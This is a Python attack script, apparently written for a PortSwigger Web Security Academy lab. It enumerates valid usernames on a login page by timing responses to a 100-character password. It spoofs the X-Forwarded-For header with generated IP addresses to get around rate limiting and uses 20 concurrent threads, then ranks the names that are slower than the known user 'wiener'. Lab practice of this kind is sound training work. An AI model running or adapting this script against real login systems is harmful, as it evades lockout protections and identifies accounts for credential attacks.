import concurrent.futures
import threading

import requests

URL = "https://0a7900e7047bef828050d05000560095.web-security-academy.net/login"
TRIES_PER_USER = 3
MAX_WORKERS = 20
PASSWORD_PROBE = "A" * 100
DELTA_THRESHOLD_SEC = 0.05

_thread_local = threading.local()


def get_session():
    if not hasattr(_thread_local, "session"):
        _thread_local.session = requests.Session()
    return _thread_local.session


def index_to_fake_ip(index):
    # 10.0.0.1 から順に払い出し、常に有効なIPv4を生成する。
    host = index + 1
    a = 10 + ((host // (256 * 256 * 256)) % 245)
    b = (host // (256 * 256)) % 256
    c = (host // 256) % 256
    d = host % 256
    return f"{a}.{b}.{c}.{d}"


def measure_username(index, username):
    session = get_session()
    total = 0.0
    ip = index_to_fake_ip(index)
    headers = {"X-Forwarded-For": ip}

    for _ in range(TRIES_PER_USER):
        data = {"username": username, "password": PASSWORD_PROBE}
        response = session.post(URL, data=data, headers=headers, timeout=10)
        total += response.elapsed.total_seconds()

    avg = total / TRIES_PER_USER
    return username, avg


def main():
    with open("usernames.txt", "r") as f:
        listed_usernames = f.read().splitlines()

    others = [u for u in listed_usernames if u != "wiener"]

    print("[*] ベースライン: wiener を先に計測")
    base_user, base_time = measure_username(0, "wiener")
    print(f"{base_user}:{base_time:.6f}")

    print("[*] 残りユーザー名をマルチスレッドで計測")
    print(f"[*] 差分閾値: {DELTA_THRESHOLD_SEC:.3f}s (wiener 比)")

    scored = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [
            executor.submit(measure_username, i + 1, username)
            for i, username in enumerate(others)
        ]

        for future in concurrent.futures.as_completed(futures):
            username, response_time = future.result()
            delta = response_time - base_time
            is_candidate = delta >= DELTA_THRESHOLD_SEC
            marker = "<-- candidate" if is_candidate else ""
            scored.append((username, response_time, delta, is_candidate))
            print(f"{username}:{response_time:.6f} | delta:{delta:+.6f} {marker}")

    print("\n[*] delta 上位候補")
    for username, response_time, delta, is_candidate in sorted(
        scored, key=lambda row: row[2], reverse=True
    )[:10]:
        marker = "*" if is_candidate else " "
        print(f"{marker} {username:20} time:{response_time:.6f} delta:{delta:+.6f}")


if __name__ == "__main__":
    main()